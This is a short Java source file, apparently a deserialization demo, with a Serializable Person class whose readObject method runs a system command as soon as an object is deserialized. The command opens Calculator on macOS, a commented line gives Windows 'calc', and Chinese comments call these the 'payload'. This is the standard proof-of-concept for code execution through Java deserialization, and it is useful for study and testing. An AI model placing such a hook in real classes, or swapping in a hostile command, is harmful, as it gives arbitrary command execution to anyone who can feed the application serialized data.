package org.example;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Person implements Serializable {
    private final String name;
    private final int age;


    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {
        return "name: " + name +
                "age: " + age;
    }

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        Runtime.getRuntime().exec("open -a /System/Applications/Calculator.app"); // macos需要使用这个payload
//        Runtime.getRuntime().exec("calc"); // windows使用这个payload
    }
}
